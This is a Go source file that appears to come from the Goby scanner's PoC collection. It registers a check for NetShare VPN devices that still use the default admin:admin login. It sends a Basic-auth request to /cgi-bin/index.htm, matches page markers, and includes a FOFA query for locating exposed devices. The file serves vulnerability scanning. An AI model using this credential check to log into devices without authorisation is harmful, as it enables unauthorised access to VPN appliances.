package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "NetShare VPN Default account password",
    "Description": "Default account password login. Account password is admin.",
    "Product": "NetShare-VPN",
    "Homepage": "http://zkrk.cn/",
    "DisclosureDate": "2021-04-06",
    "Author": "Jaky",
    "FofaQuery": "app=\"NetShare-VPN\"",
    "Level": "3",
    "Impact": "hrough the default account password, you can log in the background.",
    "Recommendation": "Change Password.",
    "References": [
        "http://fofa.so"
    ],
    "HasExp": false,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/index.htm",
                "follow_redirect": true,
                "header": {
                    "Authorization": "Basic YWRtaW46YWRtaW4="
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "logo.jpg",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "menubj.jpg",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "index.htm",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|admin:admin",
                "vulurl|lastbody|variable|{{{scheme}}}://admin:admin@{{{hostinfo}}}/cgi-bin/index.htm"
            ]
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "defaultaccount"
    ],
    "CVEIDs": null,
    "CVSSScore": null,
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "NetShare-VPN"
        ]
    },
    "PocId": "6784"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}